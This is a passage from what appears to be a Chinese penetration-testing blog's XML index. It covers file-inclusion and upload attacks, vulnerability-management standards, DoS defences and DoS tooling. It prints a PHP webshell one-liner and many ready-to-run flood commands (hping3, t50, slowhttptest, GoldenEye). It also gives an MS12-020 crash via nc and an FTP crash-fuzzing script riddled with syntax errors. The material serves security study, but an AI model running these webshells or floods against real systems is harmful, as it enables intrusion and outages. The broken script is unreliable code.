shell_exec($_GET[&#39;cmd&#39;]);?&gt;</span><br><span class="line">Apache access.log</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>远程文件包含漏洞</strong>(RFI)</p><ul><li><p>出现概率少于lfi,但更容易被利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;vulns#kali字典文件包含漏洞攻击向量</span><br></pre></td></tr></table></figure></li><li><p>文件上传漏洞</p><ul><li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li></ul></li><li><p>直接上传webshell</p></li><li><p>修改文件类型上传webshell</p><ul><li>Mimetype–文件头,扩展名</li></ul></li><li><p>修改扩展名上传webshell</p><ul><li>静态解析文件扩展名时可能无法执行</li></ul></li><li><p>文件头绕过过滤上传webshell</p></li><li><p>上传目录权限</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 文件包含漏洞 </tag>
            
            <tag> 编码绕过 </tag>
            
            <tag> 目录遍历漏洞 </tag>
            
            <tag> 命令执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞的基本概念及漏洞发现管理</title>
      <link href="/2014/02/17/Information_Gethering/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/"/>
      <url>/2014/02/17/Information_Gethering/%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4></blockquote><p>基于端口服务扫描结果版本信息(速度慢)<br>搜索已公开的漏洞数据库(数量大)<br>使用弱点扫描器实现漏洞管理</p><blockquote><h4 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h4></blockquote><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>    #kali官方漏洞库<br><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><code>sandi漏洞库</code> #程序停更<br>    <code>searchsploit tomcat</code><br>    <code>cd /usr/share/exploitdb/exploits/</code></p><blockquote><h4 id="从信息的纬度定义漏洞管理"><a href="#从信息的纬度定义漏洞管理" class="headerlink" title="从信息的纬度定义漏洞管理"></a>从信息的纬度定义漏洞管理</h4></blockquote><p>信息收集:<br>    扫描发现网络IP,OS,服务,配置,漏洞<br>    能力需求:定义扫描方式内容和目标<br>信息管理:<br>    格式化信息,并进行筛选,分组,定义优先级<br>    能力需求:资产分组,指定所有者,向所有者报告漏洞<br>信息输出:<br>    向不同层级的人群展示足够的信息量<br>    能力需求:生成报告,导出数据,与SIEM集成</p><blockquote><h5 id="漏洞扫描类型"><a href="#漏洞扫描类型" class="headerlink" title="漏洞扫描类型"></a>漏洞扫描类型</h5></blockquote><p>主动扫描<br>    有身份验证<br>    无身份验证<br>被动扫描<br>    镜像端口抓包<br>    其它来源输入<br>基于Agent的扫描<br>    支持平台有限</p><blockquote><h4 id="漏洞基本概念"><a href="#漏洞基本概念" class="headerlink" title="漏洞基本概念"></a>漏洞基本概念</h4></blockquote><h5 id="CVSS-Common-Vulnerability-Scoring-System"><a href="#CVSS-Common-Vulnerability-Scoring-System" class="headerlink" title="CVSS (Common Vulnerability Scoring System)"></a><strong>CVSS</strong> (Common Vulnerability Scoring System)</h5><p>通用漏洞评分系统–工业标准<br>描述安全漏洞严重程度的统一评分方案<br>V3版本–2015年6月10日<br>Basic Metric:基础的恒定不变的弱点权重<br>Temporal Metric:依赖时间因素的弱点权重<br>Enviromental Metric:利用弱点的环境要求和实施难度的权重<br>CVSS是安全内容自动化协议(SCAP)的一部分<br>通常CVSS与CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新<br>分值范围:0–10<br>不同机构按CVSS分会定义威胁的中,高,低威胁级别<br>CVSS体现弱点的风险,威胁级别(severity)表示弱点风险对企业的影响程度<br>CVSS分值是工业标准,但威胁级别不是<br>Vulnerability Reference</p><h5 id="CVE-Common-Vulnerabilities-and-Exposures"><a href="#CVE-Common-Vulnerabilities-and-Exposures" class="headerlink" title="CVE (Common Vulnerabilities and Exposures)"></a><strong>CVE</strong> (Common Vulnerabilities and Exposures)</h5><p>已公开的信息安全漏洞字典,统一的漏洞编号标准<br>MITRE公司负责维护(非盈利机构)<br>扫描器的大部分扫描式都对应一个CVE编号<br>实现不同厂商之间信息交换的统一标准</p><h5 id="CVE发布流程"><a href="#CVE发布流程" class="headerlink" title="CVE发布流程"></a>CVE发布流程</h5><ul><li>发现漏洞</li><li>CAN负责指定CVE ID</li><li>发布到CVE List —-CVE-2008-4250</li><li>MITRE负责对内容 进行编辑维护</li><li>很多厂商维护自己的Vulnerability Reference<br>  MS(微软)<br>  MSKB</li><li>其它Vulnerability Reference<br>  CERT    TA08-297A<br>  BID        31874<br>  IAVM    2008-A-0081<br>  OVAL    OVAL6093</li></ul><h5 id="OVAL-Open-Vulnerability-and-Assessment-Language"><a href="#OVAL-Open-Vulnerability-and-Assessment-Language" class="headerlink" title="OVAL (Open Vulnerability and Assessment Language)"></a><strong>OVAL</strong> (Open Vulnerability and Assessment Language)</h5><p>描述漏洞检测方法的机器可识别语言<br>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施漏洞检测工作<br>OVAL使用XML语言描述,包含了严密的语法逻辑</p><h5 id="CCE"><a href="#CCE" class="headerlink" title="CCE"></a><strong>CCE</strong></h5><p>描述软件配置缺陷的一种标准化格式<br>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作.</p><h5 id="CPE-Common-Product-Enumeration"><a href="#CPE-Common-Product-Enumeration" class="headerlink" title="CPE(Common Product Enumeration)`"></a><strong>CPE</strong>(Common Product Enumeration)`</h5><p>信息技术产品,系统,软件包的机构化命名规范,分类命名</p><h5 id="CWE-Common-Weakness-Enumeration"><a href="#CWE-Common-Weakness-Enumeration" class="headerlink" title="CWE (Common Weakness Enumeration)"></a><strong>CWE</strong> (Common Weakness Enumeration)</h5><p>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</p><h5 id="SCAP-Security-Content-Automation-Protocol"><a href="#SCAP-Security-Content-Automation-Protocol" class="headerlink" title="SCAP (Security Content Automation Protocol)"></a><strong>SCAP</strong> (Security Content Automation Protocol)</h5><p>SCAP是一个集合了多种安全标准框架<br>六个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF<br>目的是以标准的方法展示和操作安全数据<br>由NIST负责维护<br>SCAP主要解决三个问题<br>    实现高层政策法规等到底层实施的落地(如FISMA,ISO27000系列)<br>    将信息安全所涉及的各个要素标准化(如统一漏洞的命名及严重性度量)<br>    将复杂的系统配置核查工作自动化<br>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响.</p><h5 id="NVD-National-Vulnerability-Database"><a href="#NVD-National-Vulnerability-Database" class="headerlink" title="NVD (National Vulnerability Database)"></a><strong>NVD</strong> (National Vulnerability Database)</h5><p>美国政府的漏洞管理标准数据<br>完全基于SCAP框架<br>实现自动化漏洞管理,安全测量,合规要求<br>包含以下库<br>    安全检查列表<br>    软件安全漏洞<br>    配置错误<br>    产品名称<br>    影响度量<br>    <a href="https://nvd.nist.gov" target="_blank" rel="noopener">https://nvd.nist.gov</a></p><blockquote><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4></blockquote><p>周期性扫描跟踪漏洞<br>高位漏洞优先处理<br>扫描注意事项<br>漏洞管理三要素<br>    准确性<br>    时间<br>    资源</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞库 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DoS拒绝服务攻击防御方式</title>
      <link href="/2013/11/02/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F/"/>
      <url>/2013/11/02/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="拒绝服务攻击防御方式"><a href="#拒绝服务攻击防御方式" class="headerlink" title="拒绝服务攻击防御方式"></a><strong>拒绝服务攻击防御方式</strong></h3></blockquote><ul><li>拒绝服务攻击的防御方式通常为入侵检测，流量过滤和多重验证，旨在堵塞网络带宽的流量将被过滤，而正常的流量可正常通过。</li></ul><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a><strong>防火墙</strong></h4><ul><li>防火墙可以设置规则，例如允许或拒绝特定通讯协议，端口或IP地址。当攻击从少数不正常的IP地址发出时，可以简单的使用拒绝规则阻止一切从攻击源IP发出的通信。</li><li>复杂攻击难以用简单规则来阻止，例如80端口（网页服务）遭受攻击时不可能拒绝端口所有的通信，因为其同时会阻止合法流量。此外，防火墙可能处于网络架构中过后的位置，路由器可能在恶意流量达到防火墙前即被攻击影响。然而，防火墙能有效地防止用户从启动防火墙后的计算机发起攻击。</li></ul><h4 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a><strong>交换机</strong></h4><ul><li>大多数交换机有一定的速度限制和访问控制能力。有些交换机提供自动速度限制、流量整形、后期连接、深度包检测和假IP过滤功能，可以检测并过滤拒绝服务攻击。例如SYN洪水攻击可以通过后期连接加以预防。基于内容的攻击可以利用深度包检测阻止。</li></ul><blockquote><p>SYN COOKIE 防火墙是SYN cookie的一个扩展，SYN cookie是建立在TCP堆栈上的，他为linux操作系统提供保护。SYN cookie防火墙是linux的 一大特色，你可以使用一个防火墙来保护你的网络以避免遭受SYN洪水攻击。</p></blockquote><ol><li>一个SYN包从C发送到S</li><li>防火墙在这里扮演了S的角色来回应一个带SYN cookie的SYN-ACK包给C</li><li>C发送ACK包，接着防火墙和C的连接就建立了。</li><li>防火墙这个时候扮演C的角色发送一个SYN给S</li><li>S返回一个SYN给C</li><li>防火墙扮演C发送一个ACK确认包给S，这个时候防火墙和S的连接也就建立了</li><li>防火墙转发C和S间的数据</li></ol><p><em>如果系统遭受SYN Flood，那么第三步就不会有，而且无论在防火墙还是S都不会收到相应在第一步的SYN包，所以我们就击退了这次SYN洪水攻击。</em></p><h4 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a><strong>路由器</strong></h4><ul><li>和交换机类似，路由器也有一定的速度限制和访问控制能力，而大多数路由器很容易受到攻击影响。</li></ul><h4 id="黑洞引导"><a href="#黑洞引导" class="headerlink" title="黑洞引导"></a><strong>黑洞引导</strong></h4><ul><li>黑洞引导指将所有受攻击计算机的通信全部发送至一个“黑洞”（空接口或不存在的计算机地址）或者有足够能力处理洪流的网络设备商，以避免网络受到较大影响。</li></ul><h4 id="流量清洗"><a href="#流量清洗" class="headerlink" title="流量清洗"></a><strong>流量清洗</strong></h4><ul><li>当流量被送到DDoS防护清洗中心时，通过采用抗DDoS软件处理，将正常流量和恶意流量区分开。正常的流量则回注回客户网站。这样一来可站点能够保持正常的运作，处理真实用户访问网站带来的合法流量。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> 入侵检测 </tag>
            
            <tag> 黑洞引导 </tag>
            
            <tag> 流量清洗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DoS拒绝服务攻击工具集</title>
      <link href="/2013/10/28/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
      <url>/2013/10/28/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="拒绝服务攻击工具"><a href="#拒绝服务攻击工具" class="headerlink" title="拒绝服务攻击工具"></a><strong>拒绝服务攻击工具</strong></h3></blockquote><h4 id="RUDY"><a href="#RUDY" class="headerlink" title="RUDY"></a><strong>RUDY</strong></h4><ul><li>Are You Dead Yet?</li><li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li><li>每次只传输一个字节的数据</li><li>美剧”黑客军团”中曾提到此攻击手段</li><li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li><li><code>https://sourceforge.net/projects/r-u-dead-yet/</code></li></ul><h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a><strong>Hping3</strong></h4><ul><li>几乎可以定制发送任何 TCP/IP 数据包,用于测试FW,端口扫描,性能测试</li></ul><p><strong>syn flood 攻击</strong></p><pre><code>hping3 -c 1000 -d 120 -S -w 64 -p 80 –flood –rand-source 192.168.254.124hping3 -S -P -U -p 80 –flood –rand-source 192.168.254.124hping3 -SARFUP -p 80 –flood –rand-source 192.168.254.124     #TCP Flood</code></pre><p><strong>ICMP Flood 攻击</strong></p><pre><code>hping3 -q -n -a 1.1.1.1 –-icmp -d 200 –flood 192.168.254.124</code></pre><p><strong>UDP Flood 攻击</strong></p><pre><code>hping3 -a 1.1.1.1 -–udp -s 53 -d 100 -p 53 –flood 192.168.254.124</code></pre><p><strong>LAND攻击</strong></p><ul><li>特殊种类的SYN Flood攻击</li><li>源地址 目的地址 都是受害者与自己的完成三次握手</li></ul><pre><code>hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.2</code></pre><p><strong>TCP全链接Dos攻击</strong></p><pre><code>nping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1nping3 --echo -client &quot;public&quot; echo .nmap.org --udp        #查询公网IP</code></pre><h4 id="siege"><a href="#siege" class="headerlink" title="siege"></a><strong>siege</strong></h4><pre><code>http/https 压力测试工具，模拟多个用户并发访问请求siege -g http://10.10.10.132siege -i -c 1000 http://10.10.10.132 -A siegehttp后缀+vv即可查看实时请求同时攻击多个 url ，使用 -f 调用字典文件单独使用 siege -i -c 1000 ，也会调用字典文件（url 列表）    /etc/siege/urls.txt</code></pre><ul><li><p>扫描 banner 信息</p><p>  <code>siege -g http://10.10.10.132</code></p></li></ul><h4 id="t50网络压力测试"><a href="#t50网络压力测试" class="headerlink" title="t50网络压力测试"></a><strong>t50网络压力测试</strong></h4><pre><code>t50 1.1.1.1 --flood --turbo -S --protocol TCP --dport 80t50 1.1.1.1 --flood --turbo -S --TCP --UDP OSPE EIGRP --dport22</code></pre><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h4><pre><code>root@kali:~# grep dos /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot;&quot; -f 2broadcast-avahi-dos.nsehttp-slowloris.nseipv6-ra-flood.nsesmb-flood.nsesmb-vuln-conficker.nsesmb-vuln-cve2009-3103.nsesmb-vuln-ms06-025.nsesmb-vuln-ms07-029.nsesmb-vuln-ms08-067.nsesmb-vuln-ms10-054.nsesmb-vuln-regsvc-dos.nse</code></pre><blockquote><h3 id="匿名者黑客组织拒绝服务工具包"><a href="#匿名者黑客组织拒绝服务工具包" class="headerlink" title="匿名者黑客组织拒绝服务工具包"></a><strong>匿名者黑客组织拒绝服务工具包</strong></h3></blockquote><ul><li>LOIC</li><li>HOIC</li><li>DDoSer<br><del>招募志愿者发放以上工具</del></li><li>以上DoS工具不隐藏真实IP地址</li><li>可以在网上搜: <code>Denial of service DoS-Attack Pack Anonymous</code></li></ul><h4 id="XOIC"><a href="#XOIC" class="headerlink" title="XOIC"></a><strong>XOIC</strong></h4><ul><li>攻击任意IP地址的指定端口</li><li>三种模式：test、normal̵DoS、Attack</li><li>支持协议：TCP/HTTP/UDP/ICMP</li><li>下载地址： <code>https://tradownload.uk/results/xoic.html</code></li></ul><h4 id="HULK-Http-Unbearable-Load-King"><a href="#HULK-Http-Unbearable-Load-King" class="headerlink" title="HULK - Http Unbearable Load King"></a><strong>HULK</strong> - Http Unbearable Load King</h4><ul><li>Python脚本</li><li>随机产生大量唯一的地址请求，避免缓存命中</li><li>耗尽WEB服务器资源池,CPU资源</li><li>下载地址： <code>https://packetstormsecurity.com/files/download/112856/hulk.zip</code></li></ul><h4 id="DDoSIM"><a href="#DDoSIM" class="headerlink" title="DDoSIM"></a><strong>DDoSIM</strong></h4><ul><li>7层拒绝服务工具（模拟多个僵尸机）</li><li>随机IP地址</li><li>基于TCP连接的攻击</li><li>应用层DDoS攻击</li><li>正常的HTTP请求、非正常的HTTP请求式DDoS</li><li>SMTP DDoS</li><li>随机端口的TCP连接洪水</li></ul><h4 id="GoldenEye-黄金眼"><a href="#GoldenEye-黄金眼" class="headerlink" title="GoldenEye - 黄金眼"></a><strong>GoldenEye</strong> - 黄金眼</h4><ul><li>http/https拒绝服务攻击工具</li><li>安全研究为目的Python脚本</li><li>随机攻击向量，keep-alive，避免命中缓存</li></ul><pre><code>wget https://github.com/jseidl/GoldenEye/archive/master.zipunzip master.zipcd GoldenEye-master/./goldeneye.py http://192.168.254.124:80 -w 50</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> HULK </tag>
            
            <tag> RUDY </tag>
            
            <tag> Hping3 </tag>
            
            <tag> siege </tag>
            
            <tag> GoldenEye </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Slowloris应用层DoS</title>
      <link href="/2013/10/27/DoS/%E5%BA%94%E7%94%A8%E5%B1%82DoS/"/>
      <url>/2013/10/27/DoS/%E5%BA%94%E7%94%A8%E5%B1%82DoS/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="应用层DoS"><a href="#应用层DoS" class="headerlink" title="应用层DoS"></a><strong>应用层DoS</strong></h4></blockquote><h5 id="应用服务漏洞"><a href="#应用服务漏洞" class="headerlink" title="应用服务漏洞"></a><strong>应用服务漏洞</strong></h5><ul><li>服务代码存在漏洞,遇异常提交数据时程序崩溃</li><li>应用处理大量并发请求能力有限,被拒绝的是应用或OS</li></ul><h5 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a><strong>缓冲区溢出漏洞</strong></h5><ul><li>向目标函数随机提交数据,特定情况下数据覆盖临近寄存器或内存</li><li>影响:远程代码执行,DoS</li><li>利用模糊测试方法发现缓冲区溢出漏洞</li></ul><h4 id="CesarFTP-0-99-服务漏洞"><a href="#CesarFTP-0-99-服务漏洞" class="headerlink" title="CesarFTP 0.99 服务漏洞"></a><strong>CesarFTP 0.99</strong> 服务漏洞</h4><ul><li>流量很小</li><li>21端口</li></ul><p><strong>服务器windows xp</strong></p><ul><li>IP：192.168.190.110</li><li>安装CesarFTP</li><li>设置账号</li></ul><p><strong>攻击测试kali</strong></p><pre><code>./ftp_fuzz.py 192.168.190.110 21 A 100 2000#填写账户密码,尝试各种命令(PWD,MKD,RMD)和各种发送内容A/ABCD#在成功使服务器崩溃后，寻找特殊字符，#在这个环境里特殊字符是&quot;\n&quot;，命令是MKD、RMD</code></pre><p><strong>Python攻击脚本:</strong> <code>ftp_fuzz.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">6</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"用法: ./ftp_fuzz.py [目标IP] [目标端口] [载荷] [步长] [最大长度]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"举例：./ftp_fuzz.py 1.1.1.1 21 A 100 1000"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">char = sys.argv[<span class="number">3</span>]</span><br><span class="line">i = int(sys.argv[<span class="number">4</span>]</span><br><span class="line">step = int(sys.argv[<span class="number">4</span>])</span><br><span class="line">max = int(sys.argv[<span class="number">5</span>])</span><br><span class="line">user = raw_input(str(<span class="string">"FTP账号: "</span>))</span><br><span class="line">passwd = raw_input(str(<span class="string">"FTP密码: "</span>))</span><br><span class="line">command = raw_input(str(<span class="string">"FTP命令: "</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt;= max:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">payload = command + <span class="string">" "</span> + (char * i)</span><br><span class="line"><span class="comment">#payload = command + " " + ('\n' * i) #这个是本测试里的特殊字符</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"已发送"</span> + str(i) + <span class="string">"个 ("</span> + char + <span class="string">")"</span></span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((ip,port))</span><br><span class="line">s.recv(<span class="number">2014</span>)</span><br><span class="line">s.send(<span class="string">'USER'</span> + user + <span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2014</span>)</span><br><span class="line">s.send(<span class="string">'PASS'</span> + passwd + <span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2014</span>)</span><br><span class="line">s.send(payload + <span class="string">'\r\n'</span>)</span><br><span class="line">s.sned(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">2014</span>)</span><br><span class="line">s.close()</span><br><span class="line">i = i + step</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">pirnt <span class="string">"\n服务已崩溃"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n未发现缓冲区溢出漏洞"</span></span><br></pre></td></tr></table></figure><h4 id="Ms12-020-远程桌面协议DoS漏洞"><a href="#Ms12-020-远程桌面协议DoS漏洞" class="headerlink" title="Ms12-020 远程桌面协议DoS漏洞"></a><strong>Ms12-020 远程桌面协议DoS漏洞</strong></h4><p><strong>服务器Windows xp</strong></p><ul><li>IP：192.168.190.110</li><li>防火墙开放远程桌面</li><li>3389端口</li></ul><p><strong>攻击测试kali</strong></p><pre><code>searchsploit ms12-020 #搜索ms12-020漏洞cp /usr/share/exploitdb/exploits/windows/dos/18606.txt . #copy到当前目录mv 18606.txt  MS12-020.txt leafpad MS12-020.txt #打开看看#发现要下载http://aluigi.org/poc/termdd_1.datnc 192.168.190.110 3389 &lt; termdd_1.dat #使用nc把利用脚本发给目标机器#发了五六次之后,就蓝屏重启了#再发一次之后,就直接重启了!</code></pre><h4 id="Slowhttptest-源自google"><a href="#Slowhttptest-源自google" class="headerlink" title="Slowhttptest    (源自google)"></a><strong>Slowhttptest</strong>    (源自google)</h4><ul><li>低带宽应用层慢速DOS攻击(相对于CC等快速攻击而言的慢速)</li><li>最早由Python编写，跨平台支持(Linux、win、Cygwin、OSX)</li><li>尤其擅长攻击apache、tomcat(几乎百发百中)</li></ul><h5 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a><strong>攻击方法</strong></h5><p><strong>Slowloris、Slow HTTP POST 攻击</strong></p><ul><li>耗尽应用的并发连接池,类似于Http层的Syn flood</li><li>HTTP协议默认在服务器全部接收请求之后才开始处理,若客户端发送速度缓慢或不完整,服务器时钟为其保留连接资源池占用,此类大量并发将导致DoS</li><li>Slowloris: 完整的http请求结尾是\r\n\r\n, 攻击发\r\n…</li><li>Slow POST: HTTP头content-length声明长度，但body部分缓慢发送</li></ul><p><strong>Slow Read attack攻击</strong></p><ul><li>与slowloris and slow POST目的相同,都是耗尽应用的并发连接池</li><li>不同之处在于请求正常发送,但慢速读取响应数据</li><li>攻击者调控TCP window窗口大小,使得服务器慢速返回数据</li></ul><p><strong>Apache Range Header Attack</strong>        #针对Apache</p><ul><li>客户端传输大文件时,体积查过HTTP Body大小限制时进行分段</li><li>耗尽服务器CPU,内存资源</li></ul><p><strong>攻击测试kali</strong></p><ul><li>此类型攻击对windows服务器基本无效</li><li>被攻击端: metasploitable</li><li><code>ulimit -n 70000</code>        #系统资源分配,默认并发打开文件1024,修改为70000</li></ul><pre><code>apt-get install slowhttptest    #kali自带,没就安装#slowloris攻击slowhttptest -c 1000 -H -g -o my_header -i 10 -r 200 -t GET -u http://192.168.254.124 -x 24 -p 3slowhttptest -c 65539 -H -g -o my_header -i 10 -r 1 -t GET -u http://192.168.254.124 -x 24 -p 3 -l 99999999slowhttptest -c 3000 -H -g -o my_header_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.254.124 -x 10 -p 3slowhttptest -c 65539 -H -g -o my_header_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.254.124 -x 10 -p 3#Apache Range Header Attackslowhttptest -R -u http://192.168.254.124/ -t HEAD -c 65539 -a 10 -b 3000 -r 500    #Range不是很有效#Slow Read attack攻击slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://192.168.254.124 -p 3#HTTP Post攻击slowhttptest -c 65539 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.254.124 -x 10 -p 3</code></pre><ul><li>支持代理</li><li>大量应用服务器和安全设备都无法防护慢速攻击</li></ul><h4 id="slowhttptest参数说明"><a href="#slowhttptest参数说明" class="headerlink" title="slowhttptest参数说明"></a><strong>slowhttptest参数说明</strong></h4><pre><code>-g      在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据-H      SlowLoris模式-B      Slow POST模式-R      Range Header模式-X      Slow Read模式-c      number of connections 测试时建立的连接数-d      HTTP proxy host:port  为所有连接指定代理-e      HTTP proxy host:port  为探测连接指定代理-i      seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。-l      seconds 测试维持时间-n      seconds 在Slow Read模式下，指定每次操作的时间间隔。-o      file name 使用-g参数时，可以使用此参数指定输出文件名-p      seconds 指定等待时间来确认DoS攻击已经成功-r      connections per second 每秒连接个数-s      bytes 声明Content-Length header的值-t      HTTP verb 在请求时使用什么操作，默认GET-u      URL  指定目标url-v      level 日志等级（详细度）-w      bytes slow read模式中指定tcp窗口范围下限-x      bytes 在slowloris and Slow POST tests模式中，指定发送的最大数据长度-y      bytes slow read模式中指定tcp窗口范围上限-z      bytes 在每次的read()中，从buffer中读取数据量</code></pre><h4 id="还有一类拒绝服务"><a href="#还有一类拒绝服务" class="headerlink" title="还有一类拒绝服务"></a><strong>还有一类拒绝服务</strong></h4><ul><li><p>炸邮箱<br>  使用垃圾邮件塞满邮箱</p></li><li><p>无意识的/非故意的拒绝服务攻击<br>  数据库服务器宕机恢复后,引用队列大量请求洪水涌来<br>  告警邮件在邮件服务器修改地址后洪水攻击防火墙</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> Slowhttptest </tag>
            
            <tag> ulimit </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTP放大攻击</title>
      <link href="/2013/10/26/DoS/NTP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/"/>
      <url>/2013/10/26/DoS/NTP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/</url>
      
